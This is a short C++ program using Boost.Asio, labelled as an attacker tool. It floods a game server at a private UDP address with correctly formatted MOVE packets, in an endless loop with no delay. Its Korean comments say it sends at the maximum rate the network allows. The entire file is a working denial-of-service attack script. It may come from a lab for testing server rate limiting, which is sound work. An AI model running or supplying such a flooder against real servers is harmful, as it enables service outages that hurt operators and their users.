#include <iostream>
#include <boost/asio.hpp>

using boost::asio::ip::udp;

#pragma pack(push, 1)
enum class PacketType : uint8_t { MOVE = 0x01 };
struct MovePacket {
    PacketType type;    // 1 byte 
    uint32_t   playerId;// 4 bytes 
    float      x, y;    // 4 bytes * 2 
};
#pragma pack(pop)

int main() {
    boost::asio::io_context ctx;
    udp::socket sock(ctx, udp::endpoint(udp::v4(), 0));
    udp::endpoint server_ep(boost::asio::ip::make_address("172.20.0.10"), 9000);

    // 정상 패킷 포맷으로 세팅
    MovePacket pkt{ PacketType::MOVE, 999, 55.5f, 77.7f };
    
    std::cout << "[Attacker] Launching VALID UDP Packet Flooding...\n";
    while (true) {
        // 지연 시간 없이 네트워크가 허용하는 최대 속도로 난사
        sock.send_to(boost::asio::buffer(&pkt, sizeof(pkt)), server_ep);
    }
    return 0;
}
